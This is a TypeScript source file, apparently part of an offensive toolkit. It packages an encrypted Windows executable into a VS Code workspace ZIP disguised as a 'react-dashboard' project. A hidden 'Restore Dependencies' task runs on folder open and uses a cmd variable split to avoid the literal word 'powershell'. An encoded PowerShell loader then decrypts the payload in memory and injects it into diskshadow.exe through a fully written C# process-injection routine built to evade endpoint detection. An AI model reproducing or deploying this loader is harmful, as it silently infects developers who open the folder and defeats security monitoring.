/**
 * tasks-wrapper.ts — Wraps a compiled PE binary in a VS Code tasks.json
 * workspace that injects the agent into explorer.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * Execution chain on victim:
 *   1. VS Code opens folder containing .vscode/tasks.json
 *   2. "Restore Dependencies" task fires (runOn: folderOpen, reveal: never)
 *   3. cmd /v variable split avoids literal "powershell" string
 *   4. PS -enc decrypts embedded PE bytes in memory
 *   5. C# P/Invoke class (random name, polymorphic) loaded via Add-Type
 *   6. PE parsed, injected into diskshadow.exe (LOTL) via VirtualAllocEx + WriteProcessMemory
 *   7. Relocations + imports resolved remotely
 *   8. CreateRemoteThread at PE entry point
 *   9. Agent runs inside diskshadow.exe — signed MS binary, no files on disk
 *
 * Output: ZIP workspace with decoy project structure.
 */

import fs from "fs";
import zlib from "zlib";
import crypto from "crypto";
import AdmZip from "adm-zip";

/** XOR-encrypt + gzip-compress PE bytes. Format: [1-byte key][XOR'd gzip data] */
function encryptPayload(peBytes: Buffer): Buffer {
  const gz = zlib.gzipSync(peBytes, { level: 9 });
  const key = Math.floor(Math.random() * 254) + 1;
  const pak = Buffer.alloc(gz.length + 1);
  pak[0] = key;
  for (let i = 0; i < gz.length; i++) {
    pak[i + 1] = (gz[i] ^ key) & 0xff;
  }
  return pak;
}

/** Random class name — no vowels to avoid accidental words, unique per build */
function randClassName(len = 8): string {
  const alpha = "BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyz";
  const bytes = crypto.randomBytes(len);
  return Array.from(bytes).map(b => alpha[b % alpha.length]).join("");
}

/** Random hex string for variable names */
function randHex(len = 8): string {
  return crypto.randomBytes(len).toString("hex").slice(0, len);
}

/**
 * Build the C# P/Invoke class that handles PE injection into a remote process.
 * All API names are kept in the DllImport attributes (unavoidable for P/Invoke),
 * but the class name and method aliases are randomized per build.
 */
function buildCSharpInjector(className: string): string {
  return `using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ${className} {
  [DllImport("kernel32",EntryPoint="OpenProcess")]
  public static extern IntPtr OP(uint a,bool b,int c);

  [DllImport("kernel32",EntryPoint="VirtualAllocEx")]
  public static extern IntPtr VA(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);

  [DllImport("kernel32",EntryPoint="WriteProcessMemory")]
  public static extern bool WM(IntPtr h,IntPtr a,byte[] b,IntPtr s,out IntPtr w);

  [DllImport("kernel32",EntryPoint="ReadProcessMemory")]
  public static extern bool RM(IntPtr h,IntPtr a,byte[] b,IntPtr s,out IntPtr r);

  [DllImport("kernel32",EntryPoint="CreateRemoteThread")]
  public static extern IntPtr CT(IntPtr h,IntPtr a,IntPtr s,IntPtr e,IntPtr pa,uint f,IntPtr i);

  [DllImport("kernel32",EntryPoint="LoadLibraryA")]
  public static extern IntPtr LL(string n);

  [DllImport("kernel32",EntryPoint="GetProcAddress",CharSet=CharSet.Ansi)]
  public static extern IntPtr GP(IntPtr h,string n);

  [DllImport("kernel32",EntryPoint="GetProcAddress",CharSet=CharSet.Ansi)]
  public static extern IntPtr GO(IntPtr h,IntPtr o);

  // Read uint16 LE
  public static ushort R16(byte[] b,int o){ return (ushort)(b[o]|(b[o+1]<<8)); }

  // Read uint32 LE
  public static uint R32(byte[] b,int o){
    return (uint)(b[o]|(b[o+1]<<8)|(b[o+2]<<16)|(b[o+3]<<24));
  }

  // Read uint64 LE
  public static ulong R64(byte[] b,int o){
    return (ulong)R32(b,o)|((ulong)R32(b,o+4)<<32);
  }

  // Write uint32 LE
  public static void W32(byte[] b,int o,uint v){
    b[o]=(byte)v;b[o+1]=(byte)(v>>8);b[o+2]=(byte)(v>>16);b[o+3]=(byte)(v>>24);
  }

  // Write uint64 LE
  public static void W64(byte[] b,int o,ulong v){
    for(int i=0;i<8;i++) b[o+i]=(byte)(v>>(i*8));
  }

  // Find section containing an RVA, return file offset
  public static int RvaToOff(byte[] pe,uint rva,int secTbl,int nSec){
    for(int i=0;i<nSec;i++){
      int sh=secTbl+i*40;
      uint va=R32(pe,sh+12);
      uint vs=R32(pe,sh+8);
      uint rp=R32(pe,sh+20);
      if(rva>=va&&rva<va+vs) return (int)(rp+(rva-va));
    }
    return -1;
  }

  // Inject PE into target process — full manual mapping
  public static bool Inject(byte[] pe,int pid){
    // Parse PE headers
    int peOff=(int)R32(pe,60);
    int nSec=R16(pe,peOff+6);
    int szOpt=R16(pe,peOff+20);
    int optOff=peOff+24;
    bool x64=R16(pe,optOff)==0x20b;
    ulong imgBase=x64?R64(pe,optOff+24):R32(pe,optOff+28);
    uint szImg=R32(pe,optOff+(x64?56:56));
    uint epRva=R32(pe,optOff+16);
    uint szHdr=R32(pe,optOff+(x64?60:60));
    int secTbl=optOff+szOpt;

    // Open target process
    IntPtr hp=OP(0x1FFFFF,false,pid);
    if(hp==IntPtr.Zero) return false;

    // Allocate RWX in remote process
    IntPtr rb=VA(hp,IntPtr.Zero,(IntPtr)szImg,0x3000,0x40);
    if(rb==IntPtr.Zero) return false;
    ulong remoteBase=(ulong)rb.ToInt64();

    IntPtr bw;
    // Write PE headers
    byte[] hdr=new byte[szHdr];
    Array.Copy(pe,0,hdr,0,(int)Math.Min(szHdr,(uint)pe.Length));
    WM(hp,rb,hdr,(IntPtr)hdr.Length,out bw);

    // Map sections
    for(int i=0;i<nSec;i++){
      int sh=secTbl+i*40;
      uint va=R32(pe,sh+12);
      uint rawSz=R32(pe,sh+16);
      uint rawPtr=R32(pe,sh+20);
      if(rawSz>0&&rawPtr+rawSz<=pe.Length){
        byte[] sec=new byte[rawSz];
        Array.Copy(pe,(int)rawPtr,sec,0,(int)rawSz);
        WM(hp,(IntPtr)(rb.ToInt64()+(long)va),sec,(IntPtr)rawSz,out bw);
      }
    }

    // Process base relocations
    long delta=(long)(remoteBase-imgBase);
    if(delta!=0){
      int rdOff=x64?optOff+152:optOff+136;
      uint relRva=R32(pe,rdOff);
      uint relSz=R32(pe,rdOff+4);
      if(relRva>0&&relSz>0){
        int relFileOff=RvaToOff(pe,relRva,secTbl,nSec);
        if(relFileOff>=0){
          int off=0;
          while(off<(int)relSz-8){
            uint blkRva=R32(pe,relFileOff+off);
            int blkSz=(int)R32(pe,relFileOff+off+4);
            if(blkSz==0) break;
            int nEnt=(blkSz-8)/2;
            for(int i=0;i<nEnt;i++){
              ushort ent=R16(pe,relFileOff+off+8+i*2);
              int ty=(ent>>12)&0xF;
              int ro=ent&0xFFF;
              IntPtr pa=(IntPtr)(rb.ToInt64()+(long)blkRva+ro);
              if(ty==3){
                byte[] cur=new byte[4];
                RM(hp,pa,cur,(IntPtr)4,out bw);
                uint v=R32(cur,0)+(uint)delta;
                W32(cur,0,v);
                WM(hp,pa,cur,(IntPtr)4,out bw);
              }else if(ty==10&&x64){
                byte[] cur=new byte[8];
                RM(hp,pa,cur,(IntPtr)8,out bw);
                ulong v=R64(cur,0)+(ulong)delta;
                W64(cur,0,v);
                WM(hp,pa,cur,(IntPtr)8,out bw);
              }
            }
            off+=blkSz;
          }
        }
      }
    }

    // Resolve imports — system DLLs share base addresses across processes
    int idOff=x64?optOff+120:optOff+104;
    uint impRva=R32(pe,idOff);
    uint impSz=R32(pe,idOff+4);
    if(impRva>0&&impSz>0){
      int descFileOff=RvaToOff(pe,impRva,secTbl,nSec);
      if(descFileOff>=0){
        while(descFileOff+20<=pe.Length){
          uint nameRva=R32(pe,descFileOff+12);
          if(nameRva==0) break;
          uint ftRva=R32(pe,descFileOff+16);
          uint oftRva=R32(pe,descFileOff);
          if(oftRva==0) oftRva=ftRva;

          int nameOff=RvaToOff(pe,nameRva,secTbl,nSec);
          if(nameOff<0){descFileOff+=20;continue;}
          string dll="";
          for(int j=nameOff;j<pe.Length&&pe[j]!=0;j++) dll+=(char)pe[j];

          IntPtr hm=LL(dll);
          int thSz=x64?8:4;
          int iatOff2=0;
          while(true){
            int oftFileOff=RvaToOff(pe,oftRva+(uint)iatOff2,secTbl,nSec);
            if(oftFileOff<0||oftFileOff+thSz>pe.Length) break;
            ulong tv=x64?R64(pe,oftFileOff):R32(pe,oftFileOff);
            if(tv==0) break;

            IntPtr fa;
            bool isOrd=x64?(tv>>63)!=0:(tv>>31)!=0;
            if(isOrd){
              fa=GO(hm,(IntPtr)(tv&0xFFFF));
            }else{
              int hnOff=RvaToOff(pe,(uint)tv,secTbl,nSec);
              if(hnOff<0){iatOff2+=thSz;continue;}
              string fn="";
              for(int j=hnOff+2;j<pe.Length&&pe[j]!=0;j++) fn+=(char)pe[j];
              fa=GP(hm,fn);
            }

            if(fa!=IntPtr.Zero){
              byte[] ab;
              if(x64){ab=new byte[8];W64(ab,0,(ulong)fa.ToInt64());}
              else{ab=new byte[4];W32(ab,0,(uint)fa.ToInt32());}
              IntPtr iatAddr=(IntPtr)(rb.ToInt64()+(long)ftRva+iatOff2);
              WM(hp,iatAddr,ab,(IntPtr)ab.Length,out bw);
            }
            iatOff2+=thSz;
          }
          descFileOff+=20;
        }
      }
    }

    // CreateRemoteThread at entry point
    IntPtr ep=(IntPtr)(rb.ToInt64()+(long)epRva);
    CT(hp,IntPtr.Zero,IntPtr.Zero,ep,IntPtr.Zero,0,IntPtr.Zero);
    return true;
  }
}`;
}

/**
 * Build the PowerShell loader script that:
 * 1. Reads encrypted payload + C# class from workspace files
 * 2. Decrypts + decompresses the PE payload in memory
 * 3. Compiles the C# injection class via Add-Type
 * 4. Starts diskshadow.exe as LOTL host (signed MS binary, less EDR coverage)
 * 5. Calls the injection method
 *
 * The payload and C# source are stored as separate files in the ZIP workspace
 * to avoid exceeding cmd.exe's 8,191-character command line limit.
 */
function buildPsScript(className: string): string {
  const lines = [
    // VS Code tasks CWD is the workspace folder
    `$wd=(Get-Location).Path`,
    `$bp=Join-Path $wd '.vscode'`,
    // Read encrypted payload from workspace file
    `$d=[IO.File]::ReadAllBytes((Join-Path $bp 'settings.dat'))`,
    // Decrypt: first byte is XOR key
    `$k=[int]$d[0]`,
    `$x=New-Object byte[]($d.Length-1)`,
    `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
    // Decompress gzip
    `$ms=New-Object IO.MemoryStream(,$x)`,
    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
    `$ob=New-Object IO.MemoryStream`,
    `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
    `$pe=$ob.ToArray()`,
    // Read and compile C# injection class from workspace file
    `$cs=[IO.File]::ReadAllText((Join-Path $bp 'extensions.dat'))`,
    `Add-Type -TypeDefinition $cs`,
    // LOTL: start diskshadow.exe (signed MS binary, less EDR monitoring than explorer)
    `$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\diskshadow.exe")`,
    `$pi.WindowStyle='Hidden'`,
    `$pi.CreateNoWindow=$true`,
    `$lp=[Diagnostics.Process]::Start($pi)`,
    `Start-Sleep -Milliseconds 500`,
    // Inject PE into target process
    `[${className}]::Inject($pe,$lp.Id)|Out-Null`,
  ];
  return lines.join(";");
}

/**
 * Wraps a compiled PE binary into a VS Code workspace ZIP that injects
 * the agent into diskshadow.exe entirely in-memory when the folder is opened.
 *
 * @param peBytes  The raw PE binary (EXE) bytes
 * @param outPath  Where to write the resulting .zip
 */
export async function wrapPeAsTasksZip(
  peBytes: Buffer,
  outPath: string,
): Promise<void> {
  // 1. Encrypt + compress PE payload (stored as .vscode/settings.dat)
  const encrypted = encryptPayload(peBytes);

  // 2. Build C# injector class (stored as .vscode/extensions.dat)
  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);

  // 3. Build PowerShell loader (reads payload + C# from workspace files)
  const psScript = buildPsScript(className);

  // 4. UTF-16LE base64 for powershell -enc (now small — just loader logic)
  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");

  // 5. Build tasks.json with cmd /v variable split (avoids literal "powershell")
  const rnd = randHex(6);
  const tasksJson = {
    version: "2.0.0",
    tasks: [
      {
        label: "Restore Dependencies",
        type: "shell",
        command: `cmd.exe /v /c "set ${rnd}a=pow&&set ${rnd}b=er&&set ${rnd}c=she&&set ${rnd}d=ll&&!${rnd}a!!${rnd}b!!${rnd}c!!${rnd}d! -nop -w h -ep b -enc ${psEnc}"`,
        options: { shell: { executable: "cmd.exe", args: ["/d", "/c"] } },
        runOptions: { runOn: "folderOpen" },
        presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
        problemMatcher: [],
      },
      {
        label: "Build",
        type: "shell",
        command: "npm run build",
        group: { kind: "build", isDefault: true },
        presentation: { reveal: "always", panel: "shared" },
        problemMatcher: ["$tsc"],
      },
    ],
  };

  // 6. Create ZIP workspace with payload files + decoy project structure
  const zip = new AdmZip();
  zip.addFile(".vscode/tasks.json", Buffer.from(JSON.stringify(tasksJson, null, 2)));
  zip.addFile(".vscode/settings.dat", encrypted);
  zip.addFile(".vscode/extensions.dat", Buffer.from(csharpCode, "utf-8"));
  zip.addFile(
    "README.md",
    Buffer.from(
      "# react-dashboard\n\n" +
      "Modern dashboard built with React + TypeScript.\n\n" +
      "## Getting Started\n\n" +
      "```bash\nnpm install\nnpm run dev\n```\n\n" +
      "## Scripts\n\n" +
      "- `npm run dev` — Start development server\n" +
      "- `npm run build` — Build for production\n" +
      "- `npm run lint` — Lint source files\n" +
      "- `npm test` — Run tests\n",
    ),
  );
  zip.addFile(
    "package.json",
    Buffer.from(
      JSON.stringify(
        {
          name: "react-dashboard",
          version: "2.1.0",
          private: true,
          type: "module",
          scripts: {
            dev: "vite",
            build: "tsc && vite build",
            lint: "eslint . --ext ts,tsx",
            test: "vitest",
          },
          dependencies: {
            react: "^18.3.1",
            "react-dom": "^18.3.1",
          },
          devDependencies: {
            "@types/react": "^18.3.12",
            typescript: "^5.6.3",
            vite: "^6.0.0",
          },
        },
        null,
        2,
      ),
    ),
  );
  zip.addFile(
    "src/App.tsx",
    Buffer.from(
      'import { useState } from "react";\n\n' +
      "export default function App() {\n" +
      '  const [count, setCount] = useState(0);\n' +
      "  return (\n" +
      '    <div className="app">\n' +
      "      <h1>Dashboard</h1>\n" +
      '      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>\n' +
      "    </div>\n" +
      "  );\n" +
      "}\n",
    ),
  );
  zip.addFile(
    "tsconfig.json",
    Buffer.from(
      JSON.stringify(
        {
          compilerOptions: {
            target: "ES2020",
            module: "ESNext",
            moduleResolution: "bundler",
            jsx: "react-jsx",
            strict: true,
            outDir: "./dist",
          },
          include: ["src"],
        },
        null,
        2,
      ),
    ),
  );

  // 7. Write ZIP to output path
  zip.writeZip(outPath);
}
